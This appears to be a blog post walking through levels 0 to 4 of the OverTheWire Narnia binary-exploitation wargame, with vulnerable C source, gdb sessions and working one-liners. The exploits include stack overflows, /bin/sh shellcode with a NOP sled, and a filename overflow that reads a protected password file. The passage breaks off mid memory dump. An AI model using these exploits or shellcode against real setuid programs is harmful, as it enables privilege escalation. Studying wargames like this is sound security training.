<!DOCTYPE html>
<html lang="en">
<head>
		<title>Unlogic &mdash; Solving Narnia Part 1</title>
		<meta charset="utf-8" />
		<link rel="profile" href="http://gmpg.org/xfn/11" />
		<link rel="stylesheet" type="text/css" href="/theme/css/style.css" />
        <link rel="stylesheet" type="text/css" href="/theme/css/pygments.css" />
		<link rel='stylesheet' id='oswald-css'  href='http://fonts.googleapis.com/css?family=Oswald&#038;ver=3.3.2' type='text/css' media='all' />
		<style type="text/css">
			body.custom-background { background-color: #f5f5f5; }
		</style>
		<link rel="alternate" type="application/atom+xml"
			title="Unlogic — Flux Atom"
			href="/" /> 
		<link rel ="alternate" type="application/rss+xml"
			title="Unlogic — Flux RSS"
			href="/feed.xml" /> 
		<!--[if lte IE 8]><script src="/theme/js/html5shiv.js"></script><![endif]-->
</head>

<body class="home blog custom-background single-author" >
	<div id="container">
		<div id="header">
				<h1 id="site-title"><a href="">Unlogic</a></h1>
<h2 id="site-description">I've got a keyboard, a terminal, and a whole load of luck</h2>		</div><!-- /#banner -->
		
		<div id="menu">
			<div class="menu-navigation-container">
				<ul id="menu-navigation" class="menu">
						<li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/pages/about.html">About</a></li>
						<li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/pages/all-posts.html">All posts</a></li>

				</ul>
			</div> <!--/#menu-navigation-container-->
		</div><!-- /#menu -->
		
		<div class="page-title">
		</div>
	
		<div id="contents">

<div class="post type-post status-publish format-standard hentry category-general" id="post">
	<div class="entry-meta">
		<div class="date"><a href="/2015/04/08/solving-narnia-part-1/">Wed 08 April 2015</a></div>
			<div class="comments"><a href="/2015/04/08/solving-narnia-part-1/#disqus_thread" title="Comment on Solving Narnia Part 1">comments</a></div>
	</div> <!-- /#entry-meta -->
	<div class="main">
		<h2 class="entry-title">
			<a href="/2015/04/08/solving-narnia-part-1/" title="Permalink to Solving Narnia Part 1" rel="bookmark">Solving Narnia Part 1</a>
		</h2>
		<div class="entry-content">
			<p>Next up we take on <a class="reference external" href="http://overthewire.org/wargames/narnia/">Narnia</a>. This is a
binary exploit centered wargame, so fire up your debuggers and let's smash those
stacks. For levels 5, 6, 7, and 8, see <a class="reference external" href="http://unlogic.co.uk/2015/04/13/solving-narnia-part-2/">part 2</a></p>
<p>All levels are in <code>/narnia</code> and both the binary and the source are provided.</p>
<p>I've not included the passwords here, so you'll have to work through
the exercises yourself (or find them elsewhere :))</p>
<div class="section" id="level-00">
<h2>Level 00 ##</h2>
<div class="highlight"><pre><span></span>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main(){
        long val=0x41414141;
        char buf[20];

        printf(&quot;Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!\n&quot;);
        printf(&quot;Here is your chance: &quot;);
        scanf(&quot;%24s&quot;,&amp;buf);

        printf(&quot;buf: %s\n&quot;,buf);
        printf(&quot;val: 0x%08x\n&quot;,val);

        if(val==0xdeadbeef)
                system(&quot;/bin/sh&quot;);
        else {
                printf(&quot;WAY OFF!!!!\n&quot;);
                exit(1);
        }

        return 0;
}
</pre></div>
<p>Lines 8 and 9 tell us what we need to do. So knowing how variable allocation
on the stack works, we can exploit the setup on lines 5 and 6. <code>buf</code> is a
fixed size and is allocated <em>after</em> <code>val</code>. Therefore it sits above <code>val</code> on
the stack. As there is no <a class="reference external" href="https://en.wikipedia.org/wiki/Address_space_layout_randomization">ASLR</a>
we should be able to write over the end of <code>buf</code> and overwrite what is in memory
at <code>val</code>'s location.</p>
<p>So let's try it</p>
<div class="highlight"><pre><span></span><span class="hllgp">narnia0@melinda:/narnia$</span> python -c <span class="hlls2">&quot;print &#39;C&#39;*50&quot;</span> <span class="hllp">|</span> ./narnia0
<span class="hllgo">Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!</span>
<span class="hllgo">Here is your chance: buf: CCCCCCCCCCCCCCCCCCCCCCCC</span>
<span class="hllgo">val: 0x43434343</span>
<span class="hllgo">WAY OFF!!!!</span>
</pre></div>
<p>Right, we can confirm that we are able to change the value of <code>val</code>. Let's
tread a bit more carefully and try to see if we can do it more accurately</p>
<div class="highlight"><pre><span></span><span class="hllgp">narnia0@melinda:/narnia$</span> python -c <span class="hlls2">&quot;print &#39;C&#39;*20 + &#39;BBBB&#39;&quot;</span> <span class="hllp">|</span> ./narnia0
<span class="hllgo">Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!</span>
<span class="hllgo">Here is your chance: buf: CCCCCCCCCCCCCCCCCCCCBBBB</span>
<span class="hllgo">val: 0x42424242</span>
<span class="hllgo">WAY OFF!!!!</span>
</pre></div>
<p>So there is no space between <code>val</code> and <code>buf</code>, therefore 20 characters plus a
further 4 is enough to change val. Let's write in the correct value, reversed of
course because of the endian notation</p>
<div class="highlight"><pre><span></span><span class="hllgp">narnia0@melinda:/narnia$</span> python -c <span class="hlls2">&quot;print &#39;C&#39;*20 + &#39;\xef\xbe\xad\xde&#39;&quot;</span> <span class="hllp">|</span> ./narnia0
<span class="hllgo">Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!</span>
<span class="hllgo">Here is your chance: buf: CCCCCCCCCCCCCCCCCCCCﾭ</span>
<span class="hllgo">val: 0xdeadbeef</span>
<span class="hllgp">narnia0@melinda:/narnia$</span>
</pre></div>
<p>We did it.... but wait, where's the shell? It's closed, that's where it is. We
need to keep it open. The trick is to append the <code>cat</code> command to the input</p>
<div class="highlight"><pre><span></span><span class="hllgp">narnia0@melinda:/narnia$</span> <span class="hllo">(</span>python -c <span class="hlls2">&quot;print &#39;C&#39;*20 + &#39;\xef\xbe\xad\xde&#39;&quot;</span><span class="hllp">;</span> cat<span class="hllo">)</span> <span class="hllp">|</span> ./narnia0
<span class="hllgo">Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!</span>
<span class="hllgo">Here is your chance: buf: CCCCCCCCCCCCCCCCCCCCﾭ</span>
<span class="hllgo">val: 0xdeadbeef</span>
<span class="hllgo">id</span>
<span class="hllgo">uid=14000(narnia0) gid=14000(narnia0) euid=14001(narnia1) groups=14001(narnia1),14000(narnia0)</span>
<span class="hllgo">whoami</span>
<span class="hllgo">narnia1</span>
<span class="hllgo">cat /etc/narnia_pass/narnia1</span>
<span class="hllgo">[password]</span>
</pre></div>
</div>
<div class="section" id="level-01">
<h2>Level 01 ##</h2>
<div class="highlight"><pre><span></span>#include &lt;stdio.h&gt;

int main(){
        int (*ret)();

        if(getenv(&quot;EGG&quot;)==NULL){
                printf(&quot;Give me something to execute at the env-variable EGG\n&quot;);
                exit(1);
        }

        printf(&quot;Trying to execute EGG!\n&quot;);
        ret = getenv(&quot;EGG&quot;);
        ret();

        return 0;
}
</pre></div>
<p>So here we need to set an environment variable named <code>EGG</code> to something
we want executed. We can't just pass <code>/bin/bash</code> as it's going to call whatever
we give it as a function. Ideally we want a shell, so what we need in this case
is the shellcode to do just that.</p>
<div class="highlight"><pre><span></span><span class="hllgp">narnia1@melinda:/narnia$</span> <span class="hllnb">export</span> <span class="hllnv">EGG</span><span class="hllo">=</span><span class="hllk">$(</span>python -c<span class="hlls1">&#39;print &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80&quot;&#39;</span><span class="hllk">)</span>
<span class="hllgp">narnia1@melinda:/narnia$</span> ./narnia1
<span class="hllgo">Trying to execute EGG!</span>
<span class="hllgp">$</span> whoami
<span class="hllgo">narnia2</span>
<span class="hllgp">$</span> cat /etc/narnia_pass/narnia2
<span class="hllgo">[password]</span>
</pre></div>
</div>
<div class="section" id="level-02">
<h2>Level 02 ##</h2>
<div class="highlight"><pre><span></span>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;

int main(int argc, char * argv[]){
        char buf[128];

        if(argc == 1){
                printf(&quot;Usage: %s argument\n&quot;, argv[0]);
                exit(1);
        }
        strcpy(buf,argv[1]);
        printf(&quot;%s&quot;, buf);

        return 0;
}
</pre></div>
<p>The biggest clues here are lines 6 and 12. Copying user supplied data
into a fixed sized array without any bound checking is always asking for
trouble. <code>narnia2</code> binary also runs as setuid narnia3, which leads us to believe
we will be able to control the stack and get it to execute a payload of our
choosing. Of course this will be a shellcode to drop us into a shell.</p>
<p>First we need to work out how much data is needed to overwrite <code>EIP</code>. We can
do this by trial and error, or we can use a pattern generator. I am going to
use my <a class="reference external" href="https://github.com/Svenito/exploit-pattern">pattern generator</a> instead
of metasploit's one. I'll create a payload big enugh to overflow the
buffer and then check the value of <code>EIP</code>. Pasting that back into the pattern
generator will tell us at what location in the pattern the string occurs.</p>
<div class="highlight"><pre><span></span><span class="hllgo">local $] ./pattern.py 150</span>
<span class="hllgo">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5</span>
<span class="hllgo">Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="hllgp">narnia2@melinda:/narnia$</span> gdb -q narnia2
<span class="hllgo">Reading symbols from narnia2...(no debugging symbols found)...done.</span>
<span class="hllgo">(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9</span>
<span class="hllgo">Starting program: /games/narnia/narnia2 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9</span>

<span class="hllgo">Program received signal SIGSEGV, Segmentation fault.</span>
<span class="hllgo">0x37654136 in ?? ()</span>
<span class="hllgo">(gdb) info reg</span>
<span class="hllgo">eax            0x0      0</span>
<span class="hllgo">ecx            0x0      0</span>
<span class="hllgo">edx            0xf7fcb898       -134432616</span>
<span class="hllgo">ebx            0xf7fca000       -134438912</span>
<span class="hllgo">esp            0xffffd640       0xffffd640</span>
<span class="hllgo">ebp            0x65413565       0x65413565</span>
<span class="hllgo">esi            0x0      0</span>
<span class="hllgo">edi            0x0      0</span>
<span class="hllgo">eip            0x37654136       0x37654136</span>
<span class="hllgo">eflags         0x10282  [ SF IF RF ]</span>
<span class="hllgo">cs             0x23     35</span>
<span class="hllgo">ss             0x2b     43</span>
<span class="hllgo">ds             0x2b     43</span>
<span class="hllgo">es             0x2b     43</span>
<span class="hllgo">fs             0x0      0</span>
<span class="hllgo">gs             0x63     99</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="hllgo">local $] ./pattern.py 0x37654136</span>
<span class="hllgo">Pattern 0x37654136 first occurrence at position 140 in pattern.</span>
</pre></div>
<p>We can control <code>EIP</code> with whatever we put at position 140 of our payload. But
what do we put there? Well for that we need to figure out where the rest of our
data is going. Using a known payload let's see where our input ends up:</p>
<div class="highlight"><pre><span></span><span class="hllgo">(gdb) run $(python -c &quot;print &#39;a&#39; * 140 + &#39;b&#39; * 4&quot;)</span>
<span class="hllgo">Starting program: /games/narnia/narnia2 $(python -c &quot;print &#39;a&#39; * 140 + &#39;b&#39; * 4&quot;)</span>

<span class="hllgo">Program received signal SIGSEGV, Segmentation fault.</span>
<span class="hllgo">0x62626262 in ?? ()</span>
<span class="hllgo">(gdb) x/200x $esp</span>
<span class="hllgo">(gdb) x/200x $esp</span>
<span class="hllgo">0xffffd650:     0x00000000      0xffffd6e4      0xffffd6f0      0xf7feacea</span>
<span class="hllgo">0xffffd660:     0x00000002      0xffffd6e4      0xffffd684      0x08049768</span>
<span class="hllgo">0xffffd670:     0x0804821c      0xf7fca000      0x00000000      0x00000000</span>
<span class="hllgo">0xffffd680:     0x00000000      0xed18585e      0xd520bc4e      0x00000000</span>
<span class="hllgo">0xffffd690:     0x00000000      0x00000000      0x00000002      0x08048360</span>
<span class="hllgo">0xffffd6a0:     0x00000000      0xf7ff0500      0xf7e3c979      0xf7ffd000</span>
<span class="hllgo">0xffffd6b0:     0x00000002      0x08048360      0x00000000      0x08048381</span>
<span class="hllgo">0xffffd6c0:     0x0804845d      0x00000002      0xffffd6e4      0x080484d0</span>
<span class="hllgo">0xffffd6d0:     0x08048540      0xf7feb180      0xffffd6dc      0x0000001c</span>
<span class="hllgo">0xffffd6e0:     0x00000002      0xffffd812      0xffffd828      0x00000000</span>
<span class="hllgo">0xffffd6f0:     0xffffd8b9      0xffffd8cd      0xffffd8dd      0xffffd8f0</span>
<span class="hllgo">0xffffd700:     0xffffd913      0xffffd927      0xffffd930      0xffffd93d</span>
<span class="hllgo">0xffffd710:     0xffffde5e      0xffffde69      0xffffde75      0xffffded3</span>
<span class="hllgo">0xffffd720:     0xffffdeea      0xffffdef9      0xffffdf05      0xffffdf16</span>
<span class="hllgo">0xffffd730:     0xffffdf1f      0xffffdf32      0xffffdf3a      0xffffdf4a</span>
<span class="hllgo">0xffffd740:     0xffffdf80      0xffffdfa0      0xffffdfc0      0x00000000</span>
<span class="hllgo">0xffffd750:     0x00000020      0xf7fdbb60      0x00000021      0xf7fdb000</span>
<span class="hllgo">0xffffd760:     0x00000010      0x1f898b75      0x00000006      0x00001000</span>
<span class="hllgo">0xffffd770:     0x00000011      0x00000064      0x00000003      0x08048034</span>
<span class="hllgo">0xffffd780:     0x00000004      0x00000020      0x00000005      0x00000008</span>
<span class="hllgo">0xffffd790:     0x00000007      0xf7fdc000      0x00000008      0x00000000</span>
<span class="hllgo">0xffffd7a0:     0x00000009      0x08048360      0x0000000b      0x000036b2</span>
<span class="hllgo">0xffffd7b0:     0x0000000c      0x000036b2      0x0000000d      0x000036b2</span>
<span class="hllgo">0xffffd7c0:     0x0000000e      0x000036b2      0x00000017      0x00000000</span>
<span class="hllgo">0xffffd7d0:     0x00000019      0xffffd7fb      0x0000001f      0xffffdfe2</span>
<span class="hllgo">0xffffd7e0:     0x0000000f      0xffffd80b      0x00000000      0x00000000</span>
<span class="hllgo">0xffffd7f0:     0x00000000      0x00000000      0xe8000000      0x7c03ba19</span>
<span class="hllgo">0xffffd800:     0x2bd0895a      0x3866226d      0x69ad5957      0x00363836</span>
<span class="hllgo">0xffffd810:     0x672f0000      0x73656d61      0x72616e2f      0x2f61696e</span>
<span class="hllgo">0xffffd820:     0x6e72616e      0x00326169      0x61616161      0x61616161</span>
<span class="hllgo">0xffffd830:     0x61616161      0x61616161      0x61616161      0x61616161</span>
<span class="hllgo">0xffffd840:     0x61616161      0x61616161      0x61616161      0x61616161</span>
<span class="hllgo">0xffffd850:     0x61616161      0x61616161      0x61616161      0x61616161</span>
<span class="hllgo">0xffffd860:     0x61616161      0x61616161      0x61616161      0x61616161</span>
<span class="hllgo">0xffffd870:     0x61616161      0x61616161      0x61616161      0x61616161</span>
<span class="hllgo">0xffffd880:     0x61616161      0x61616161      0x61616161      0x61616161</span>
<span class="hllgo">0xffffd890:     0x61616161      0x61616161      0x61616161      0x61616161</span>
<span class="hllgo">0xffffd8a0:     0x61616161      0x61616161      0x61616161      0x61616161</span>
<span class="hllgo">0xffffd8b0:     0x61616161      0x62626262      0x47445800      0x5345535f</span>
<span class="hllgo">0xffffd8c0:     0x4e4f4953      0x3d44495f      0x30333035      0x45485300</span>
<span class="hllgo">0xffffd8d0:     0x2f3d4c4c      0x2f6e6962      0x68736162      0x52455400</span>
<span class="hllgo">0xffffd8e0:     0x78723d4d      0x322d7476      0x6f633635      0x00726f6c</span>
<span class="hllgo">0xffffd8f0:     0x5f485353      0x45494c43      0x323d544e      0x322e3231</span>
<span class="hllgo">0xffffd900:     0x37352e33      0x3136312e      0x35333320      0x34203932</span>
<span class="hllgo">0xffffd910:     0x53003334      0x545f4853      0x2f3d5954      0x2f766564</span>
<span class="hllgo">0xffffd920:     0x2f737470      0x4c003033      0x4c415f43      0x00433d4c</span>
<span class="hllgo">0xffffd930:     0x52455355      0x72616e3d      0x3261696e      0x5f534c00</span>
<span class="hllgo">0xffffd940:     0x4f4c4f43      0x723d5352      0x3a303d73      0x303d6964</span>
<span class="hllgo">0xffffd950:     0x34333b31      0x3d6e6c3a      0x333b3130      0x686d3a36</span>
<span class="hllgo">0xffffd960:     0x3a30303d      0x343d6970      0x33333b30      0x3d6f733a</span>
</pre></div>
<p>We see our payload start at <code>0xffffd828</code> with the last 4 bytes at <code>0xffffd8b4</code></p>
<p>The buffer gives us 128 bytes to play with. Our shellcode is 25 bytes, so we'll pad the
start with a <a class="reference external" href="https://en.wikipedia.org/wiki/NOP_slide">nop sled</a> to adjust for
the memory offset introduced by <code>gdb</code>. Then set the <code>EIP</code> to somewhere in the middle
of the sled</p>
<div class="highlight"><pre><span></span><span class="hllgp">narnia2@melinda:/narnia$</span> ./narnia2 <span class="hllsb">`</span>python -c <span class="hlls2">&quot;print &#39;\x90&#39;*115 + &#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80&#39; + &#39;\x60\xd8\xff\xff&#39;&quot;</span><span class="hllsb">`</span>
<span class="hllgp">$</span> whoami
<span class="hllgo">narnia3</span>
<span class="hllgp">$</span> cat /etc/narnia_pass/narnia3
<span class="hllgo">[password]</span>
</pre></div>
</div>
<div class="section" id="level-03">
<h2>Level 03 ##</h2>
<div class="highlight"><pre><span></span>#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

int main(int argc, char **argv){

        int  ifd,  ofd;
        char ofile[16] = &quot;/dev/null&quot;;
        char ifile[32];
        char buf[32];

        if(argc != 2){
                printf(&quot;usage, %s file, will send contents of file 2 /dev/null\n&quot;,argv[0]);
                exit(-1);
        }

        /* open files */
        strcpy(ifile, argv[1]);
        if((ofd = open(ofile,O_RDWR)) &lt; 0 ){
                printf(&quot;error opening %s\n&quot;, ofile);
                exit(-1);
        }
        if((ifd = open(ifile, O_RDONLY)) &lt; 0 ){
                printf(&quot;error opening %s\n&quot;, ifile);
                exit(-1);
        }

        /* copy from file1 to file2 */
        read(ifd, buf, sizeof(buf)-1);
        write(ofd,buf, sizeof(buf)-1);
        printf(&quot;copied contents of %s to a safer place... (%s)\n&quot;,ifile,ofile);

        /* close &#39;em */
        close(ifd);
        close(ofd);

        exit(1);
}
</pre></div>
<p>At first glance this looks a bit more complicated. However it is just another
buffer overflow (line 13 and 22). This time however we don't control the stack,
we control where the file gets written to. <code>/dev/null</code> is not a useful place
for data, and we want the contents of <code>/etc/narnia_pass/narnia4</code>. As <code>narnia3</code> runs
setuid narnia4, it can do that for us.</p>
<p>First we determine that we need 32 characters to overflow the buffer. Then anything
beyond that will get written to the ofile. So the plan is to to create a symlink to
<code>narnia4</code> that is 32 characters long, and then write that to the target. The issue here
is that the source path's last 16 characters need to be the same as the target.
So to do this I created the following directory and symlink:</p>
<div class="highlight"><pre><span></span><span class="hllgp">narnia3@melinda:/narnia$</span> mkdir -p /tmp/xxxxxxxxxxxxxxxxxxxxxxxxxxx/tmp
<span class="hllgp">narnia3@melinda:/narnia$</span> ln -s /etc/narnia_pass/narnia4 /tmp/xxxxxxxxxxxxxxxxxxxxxxxxxxx/tmp/narn4
</pre></div>
<p>Now when we pass that to <code>narnia3</code>:</p>
<div class="highlight"><pre><span></span><span class="hllgp">narnia3@melinda:/narnia$</span> ./narnia3 <span class="hllsb">`</span>python -c <span class="hlls2">&quot;print &#39;/tmp/&#39; + &#39;x&#39;*27 + &#39;/tmp/narn4&#39;&quot;</span><span class="hllsb">`</span>
<span class="hllgo">copied contents of /tmp/xxxxxxxxxxxxxxxxxxxxxxxxxxx/tmp/narn4 to a safer place... (/tmp/narn4)</span>
<span class="hllgp">narnia3@melinda:/narnia$</span> cat /tmp/narn4
<span class="hllgo">[password]</span>
</pre></div>
<p>It's a little odd, but I hope you understand what happened. The last part of the
first path has to be a valid path, so that it can be written to. That's why we have
the double <code>/tmp</code> setup.</p>
</div>
<div class="section" id="level-04">
<h2>Level 04 ##</h2>
<div class="highlight"><pre><span></span>#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;ctype.h&gt;

extern char **environ;

int main(int argc,char **argv){
        int i;
        char buffer[256];

        for(i = 0; environ[i] != NULL; i++)
                memset(environ[i], &#39;\0&#39;, strlen(environ[i]));

        if(argc&gt;1)
                strcpy(buffer,argv[1]);

        return 0;
}
</pre></div>
<p>MOAR OVERFLOWS. This time you'll notice something at line 6. What this does
is <a class="reference external" href="http://man7.org/linux/man-pages/man7/environ.7.html">store the user environment</a>.
This then get zerod out inside <code>main</code> to prevent us from storing any shellcode
in environment variables. However we might still be able to write <code>EIP</code>, so using the
trusty pattern generator from before</p>
<div class="highlight"><pre><span></span><span class="hllgo">local $] ./pattern.py 300</span>
<span class="hllgo">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7</span>
<span class="hllgo">Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5</span>
<span class="hllgo">Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3</span>
<span class="hllgo">Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="hllgp">narnia4@melinda:/narnia$</span> gdb -q ./narnia4
<span class="hllgo">Reading symbols from ./narnia4...(no debugging symbols found)...done.</span>
<span class="hllgo">(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5</span>
<span class="hllgo">Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4</span>
<span class="hllgo">Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3</span>
<span class="hllgo">Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9</span>
<span class="hllgo">Starting program: /games/narnia/narnia4 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5</span>
<span class="hllgo">Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4</span>
<span class="hllgo">Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3</span>
<span class="hllgo">Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9</span>

<span class="hllgo">Program received signal SIGSEGV, Segmentation fault.</span>
<span class="hllgo">0x316a4130 in ?? ()</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="hllgo">local $] ./pattern.py 0x316a4130</span>
<span class="hllgo">Pattern 0x316a4130 first occurrence at position 272 in pattern.</span>
</pre></div>
<p>This tells us we have 272 bytes to play with. Plenty of space to construct
a nopsled and shellcode payload. Let's find out what we need to write into
<code>EIP</code>.</p>
<div class="highlight"><pre><span></span><span class="hllgo">(gdb) r $(python -c &quot;print &#39;a&#39;*272 + &#39;bbbb&#39;&quot;)</span>
<span class="hllgo">Starting program: /games/narnia/narnia4 $(python -c &quot;print &#39;a&#39;*272 + &#39;bbbb&#39;&quot;)</span>

<span class="hllgo">Program received signal SIGSEGV, Segmentation fault.</span>
<span class="hllgo">0x62626262 in ?? ()</span>
<span class="hllgo">(gdb) x/200x $esp</span>
<span class="hllgo">0xffffd5c0:     0x00000000      0xffffd654      0xffffd660      0xf7feacea</span>
<span class="hllgo">0xffffd5d0:     0x00000002      0xffffd654      0xffffd5f4      0x080497cc</span>
<span class="hllgo">0xffffd5e0:     0x0804825c      0xf7fca000      0x00000000      0x00000000</span>
<span class="hllgo">0xffffd5f0:     0x00000000      0x7cc8a421      0x44f76031      0x00000000</span>
<span class="hllgo">0xffffd600:     0x00000000      0x00000000      0x00000002      0x080483b0</span>
<span class="hllgo">0xffffd610:     0x00000000      0xf7ff0500      0xf7e3c979      0xf7ffd000</span>
<span class="hllgo">0xffffd620:     0x00000002      0x080483b0      0x00000000      0x080483d1</span>
<span class="hllgo">0xffffd630:     0x080484ad      0x00000002      0xffffd654      0x08048550</span>
<span class="hllgo">0xffffd640:     0x080485c0      0xf7feb180      0xffffd64c      0x0000001c</span>
<span class="hllgo">0xffffd650:     0x00000002      0xffffd78f      0xffffd7a5      0x00000000</span>
<span class="hllgo">0xffffd660:     0xffffd8ba      0xffffd8ce      0xffffd8de      0xffffd8f1</span>
<span class="hllgo">0xffffd670:     0xffffd914      0xffffd927      0xffffd930      0xffffd93d</span>
<span class="hllgo">0xffffd680:     0xffffde5e      0xffffde69      0xffffde75      0xffffded3</span>
<span class="hllgo">0xffffd690:     0xffffdeea      0xffffdef9      0xffffdf05      0xffffdf16</span>
<span class="hllgo">0xffffd6a0:     0xffffdf1f      0xffffdf32      0xffffdf3a      0xffffdf4a</span>
<span class="hllgo">0xffffd6b0:     0xffffdf80      0xffffdfa0      0xffffdfc0      0x00000000</span>
<span class="hllgo">0xffffd6c0:     0x00000020      0xf7fdbb60      0x00000021      0xf7fdb000</span>
<span class="hllgo">0xffffd6d0:     0x00000010      0x1f898b75      0x00000006      0x00001000</span>
<span class="hllgo">0xffffd6e0:     0x00000011      0x00000064      0x00000003      0x08048034</span>
<span class="hllgo">0xffffd6f0:     0x00000004      0x00000020      0x00000005      0x00000008</span>
<span class="hllgo">0xffffd700:     0x00000007      0xf7fdc000      0x00000008      0x00000000</span>
<span class="hllgo">0xffffd710:     0x00000009      0x080483b0      0x0000000b      0x000036b4</span>
<span class="hllgo">0xffffd720:     0x0000000c      0x000036b4      0x0000000d      0x000036b4</span>
<span class="hllgo">0xffffd730:     0x0000000e      0x000036b4      0x00000017      0x00000000</span>
<span class="hllgo">0xffffd740:     0x00000019      0xffffd76b      0x0000001f      0xffffdfe2</span>
<span class="hllgo">0xffffd750:     0x0000000f      0xffffd77b      0x00000000      0x00000000</span>
<span class="hllgo">0xffffd760:     0x00000000      0x00000000      0x9e000000      0x9213cb6c</span>
<span class="hllgo">0xffffd770:     0x8eef41b1      0xe0574cc7      0x69a73659      0x00363836</span>
<span class="hllgo">0xffffd780:     0x00000000      0x00000000      0x00000000      0x2f000000</span>
<span class="hllgo">0xffffd790:     0x656d6167      0x616e2f73      0x61696e72      0x72616e2f</span>
<span class="hllgo">0xffffd7a0:     0x3461696e      0x61616100      0x61616161      0x61616161</span>
<span class="hllgo">0xffffd7b0:     0x61616161      0x61616161      0x61616161      0x61616161</span>
<span class="hllgo">0xffffd7c0:     0x61616161      0x61616161      0x61616161      0x61616161</span>
<span class="hllgo">0xffffd7d0:     0x61616161      0x61616161      0x61616161      0x61616161</span>
<span class="hllgo">0xffffd7e0:     0x61616161      0x61616161      0x61616161      0x61616161</span>
<span class="hllgo">0xffffd7f0:     0x61616161      0x61616161      0x61616161      0x61616161</span>
<span class="hllgo">0xffffd800:     0x61616161      0x61616161      0x61616161      0x61616161</span>
<span class="hllgo">0xffffd810:     0x61616161      0x61616161      0x61616161      0x61616161</span>
<span class="hllgo">0xffffd820:     0x61616161      0x61616161      0x61616161      0x61616161</span>
<span class="hllgo">0xffffd830:     0x61616161      0x61616161      0x61616161      0x61616161</span>
<span class="hllgo">0xffffd840:     0x61616161      0x61616161      0x61616161      0x61616161</span>
<span class="hllgo">0xffffd850:     0x61616161      0x61616161      0x61616161      0x61616161</span>
<span class="hllgo">0xffffd860:     0x61616161      0x61616161      0x61616161      0x61616161</span>
<span class="hllgo">0xffffd870:     0x61616161      0x61616161      0x61616161      0x61616161</span>
<span class="hllgo">0xffffd880:     0x61616161      0x61616161      0x61616161      0x61616161</span>
